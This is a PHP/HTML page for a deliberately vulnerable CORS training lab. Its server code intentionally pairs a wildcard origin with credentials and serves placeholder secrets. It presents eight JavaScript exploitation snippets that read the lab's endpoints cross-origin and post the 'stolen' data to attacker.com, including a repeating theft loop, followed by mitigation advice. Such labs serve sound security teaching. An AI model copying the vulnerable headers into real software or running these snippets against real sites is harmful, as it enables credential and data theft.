<?php
// Lab 1: Basic CORS Misconfiguration
// Vulnerability: Basic CORS policy misconfigurations

session_start();

$message = '';
$cors_headers = [];

// Simulate CORS misconfiguration
function set_cors_headers() {
    // Vulnerable: Basic CORS misconfiguration
    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
    header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With");
    header("Access-Control-Allow-Credentials: true");
    
    // Handle preflight requests
    if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
        http_response_code(200);
        exit();
    }
}

// Set CORS headers
set_cors_headers();

// Simulate API endpoint
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action'])) {
    $action = $_GET['action'];
    
    switch ($action) {
        case 'user':
            $user_data = [
                'id' => 1,
                'username' => 'admin',
                'email' => 'admin@example.com',
                'role' => 'administrator',
                'permissions' => ['read', 'write', 'delete', 'admin']
            ];
            header('Content-Type: application/json');
            echo json_encode($user_data);
            exit();
            
        case 'sensitive':
            $sensitive_data = [
                'api_key' => 'sk-1234567890abcdef',
                'database_url' => 'mysql://user:pass@localhost:3306/db',
                'secret_token' => 'secret_token_12345',
                'admin_password' => 'admin123'
            ];
            header('Content-Type: application/json');
            echo json_encode($sensitive_data);
            exit();
            
        case 'config':
            $config_data = [
                'debug_mode' => true,
                'database_host' => 'localhost',
                'database_port' => 3306,
                'redis_url' => 'redis://localhost:6379',
                'jwt_secret' => 'jwt_secret_key_12345'
            ];
            header('Content-Type: application/json');
            echo json_encode($config_data);
            exit();
    }
}

// Handle POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    
    if (isset($input['action'])) {
        switch ($input['action']) {
            case 'update_profile':
                $message = '<div class="alert alert-success">Profile updated successfully!</div>';
                break;
            case 'change_password':
                $message = '<div class="alert alert-success">Password changed successfully!</div>';
                break;
            case 'delete_account':
                $message = '<div class="alert alert-success">Account deleted successfully!</div>';
                break;
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 1: Basic CORS Misconfiguration - CORS Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .api-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .cors-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to CORS Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 1: Basic CORS Misconfiguration</h1>
            <p class="hero-subtitle">Basic CORS policy misconfigurations</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Low</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates basic CORS misconfigurations where the server allows requests from any origin using wildcard (*) and includes credentials. This allows attackers to make cross-origin requests and potentially steal sensitive data.</p>
            <p><strong>Objective:</strong> Exploit CORS misconfigurations to access sensitive data from different origins.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable CORS Headers
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: Basic CORS misconfiguration
function set_cors_headers() {
    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
    header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With");
    header("Access-Control-Allow-Credentials: true");
    
    // Handle preflight requests
    if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
        http_response_code(200);
        exit();
    }
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-slash me-2"></i>CORS API Tester
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="cors-warning">
                            <h5>⚠️ CORS Warning</h5>
                            <p>This lab demonstrates CORS misconfigurations. The following are vulnerable:</p>
                            <ul>
                                <li><code>Access-Control-Allow-Origin: *</code> - Allows any origin</li>
                                <li><code>Access-Control-Allow-Credentials: true</code> - Allows credentials</li>
                                <li><code>Access-Control-Allow-Methods: *</code> - Allows all methods</li>
                                <li><code>Access-Control-Allow-Headers: *</code> - Allows all headers</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>API Endpoints</h5>
                            <p>Try these API endpoints:</p>
                            <ul>
                                <li><code>?action=user</code> - User data</li>
                                <li><code>?action=sensitive</code> - Sensitive data</li>
                                <li><code>?action=config</code> - Configuration data</li>
                            </ul>
                        </div>
                        
                        <div class="mt-3">
                            <button onclick="testCORS('user')" class="btn btn-primary me-2">Test User Data</button>
                            <button onclick="testCORS('sensitive')" class="btn btn-primary me-2">Test Sensitive Data</button>
                            <button onclick="testCORS('config')" class="btn btn-primary">Test Config Data</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>API Response
                    </div>
                    <div class="card-body">
                        <div class="api-display">
                            <h5>API Response (May contain sensitive data):</h5>
                            <div id="api-response">Click a button above to test the API</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> CORS Misconfiguration</li>
                        <li><strong>Severity:</strong> High</li>
                        <li><strong>Method:</strong> GET/POST</li>
                        <li><strong>Issue:</strong> Wildcard origin with credentials</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Attack Vectors</h5>
                    <ul>
                        <li><strong>Data Theft:</strong> Access sensitive data</li>
                        <li><strong>CSRF:</strong> Cross-site request forgery</li>
                        <li><strong>API Abuse:</strong> Unauthorized API access</li>
                        <li><strong>Credential Theft:</strong> Steal authentication data</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>CORS Exploitation Examples</h5>
            <p>Use these techniques to exploit CORS misconfigurations:</p>
            
            <h6>1. Basic CORS Exploitation (JavaScript):</h6>
            <div class="code-block">// Test CORS from any origin
fetch('http://vulnerable-site.com/api?action=user', {
    method: 'GET',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/json'
    }
})
.then(response => response.json())
.then(data => {
    console.log('Stolen data:', data);
    // Send data to attacker server
    fetch('http://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});</div>

            <h6>2. Cross-Origin Request with Credentials:</h6>
            <div class="code-block">// Exploit CORS with credentials
fetch('http://vulnerable-site.com/api?action=sensitive', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors',
    headers: {
        'Authorization': 'Bearer ' + localStorage.getItem('token'),
        'Content-Type': 'application/json'
    }
})
.then(response => response.json())
.then(data => {
    // Steal sensitive data
    console.log('Sensitive data stolen:', data);
});</div>

            <h6>3. POST Request Exploitation:</h6>
            <div class="code-block">// Exploit CORS with POST requests
fetch('http://vulnerable-site.com/api', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + localStorage.getItem('token')
    },
    body: JSON.stringify({
        action: 'update_profile',
        email: 'attacker@evil.com'
    })
})
.then(response => response.json())
.then(data => {
    console.log('Profile updated:', data);
});</div>

            <h6>4. XMLHttpRequest Exploitation:</h6>
            <div class="code-block">// Using XMLHttpRequest for CORS exploitation
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://vulnerable-site.com/api?action=config', true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
        var data = JSON.parse(xhr.responseText);
        console.log('Config stolen:', data);
        // Send to attacker server
        var xhr2 = new XMLHttpRequest();
        xhr2.open('POST', 'http://attacker.com/steal', true);
        xhr2.send(JSON.stringify(data));
    }
};
xhr.send();</div>

            <h6>5. jQuery AJAX Exploitation:</h6>
            <div class="code-block">// Using jQuery for CORS exploitation
$.ajax({
    url: 'http://vulnerable-site.com/api?action=user',
    type: 'GET',
    xhrFields: {
        withCredentials: true
    },
    crossDomain: true,
    success: function(data) {
        console.log('User data stolen:', data);
        // Send to attacker server
        $.post('http://attacker.com/steal', {
            data: JSON.stringify(data)
        });
    }
});</div>

            <h6>6. Fetch API with Error Handling:</h6>
            <div class="code-block">// Robust CORS exploitation with error handling
async function exploitCORS() {
    try {
        const response = await fetch('http://vulnerable-site.com/api?action=sensitive', {
            method: 'GET',
            credentials: 'include',
            mode: 'cors',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': 'Bearer ' + localStorage.getItem('token')
            }
        });
        
        if (response.ok) {
            const data = await response.json();
            console.log('Sensitive data stolen:', data);
            
            // Send to attacker server
            await fetch('http://attacker.com/steal', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });
        }
    } catch (error) {
        console.error('CORS exploitation failed:', error);
    }
}

exploitCORS();</div>

            <h6>7. Multiple Endpoint Exploitation:</h6>
            <div class="code-block">// Exploit multiple endpoints
const endpoints = ['user', 'sensitive', 'config'];
const stolenData = {};

endpoints.forEach(async (endpoint) => {
    try {
        const response = await fetch(`http://vulnerable-site.com/api?action=${endpoint}`, {
            method: 'GET',
            credentials: 'include',
            mode: 'cors'
        });
        
        if (response.ok) {
            const data = await response.json();
            stolenData[endpoint] = data;
            console.log(`${endpoint} data stolen:`, data);
        }
    } catch (error) {
        console.error(`Failed to exploit ${endpoint}:`, error);
    }
});

// Send all stolen data
setTimeout(() => {
    fetch('http://attacker.com/steal-all', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(stolenData)
    });
}, 5000);</div>

            <h6>8. Real-time Data Theft:</h6>
            <div class="code-block">// Continuous data theft
setInterval(async () => {
    try {
        const response = await fetch('http://vulnerable-site.com/api?action=user', {
            method: 'GET',
            credentials: 'include',
            mode: 'cors'
        });
        
        if (response.ok) {
            const data = await response.json();
            // Send to attacker server
            fetch('http://attacker.com/steal-realtime', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    data: data
                })
            });
        }
    } catch (error) {
        console.error('Real-time theft failed:', error);
    }
}, 10000); // Every 10 seconds</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Data theft and sensitive information disclosure</li>
                <li>Session hijacking and account takeover</li>
                <li>Cross-Site Request Forgery (CSRF) attacks</li>
                <li>API abuse and unauthorized access</li>
                <li>Compliance violations and security breaches</li>
                <li>Privilege escalation and lateral movement</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Use specific origins instead of wildcard (*)</li>
                    <li>Avoid using credentials with wildcard origins</li>
                    <li>Implement proper origin validation</li>
                    <li>Use whitelist-based CORS policies</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual cross-origin requests</li>
                    <li>Implement proper authentication and authorization</li>
                    <li>Use Content Security Policy (CSP)</li>
                    <li>Implement rate limiting and request validation</li>
                </ul>
            </div>
        </div>
    </div>

    <script>
        function testCORS(action) {
            fetch(`?action=${action}`, {
                method: 'GET',
                credentials: 'include',
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(response => response.json())
            .then(data => {
                document.getElementById('api-response').innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
            })
            .catch(error => {
                document.getElementById('api-response').innerHTML = '<div class="alert alert-danger">Error: ' + error.message + '</div>';
            });
        }
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
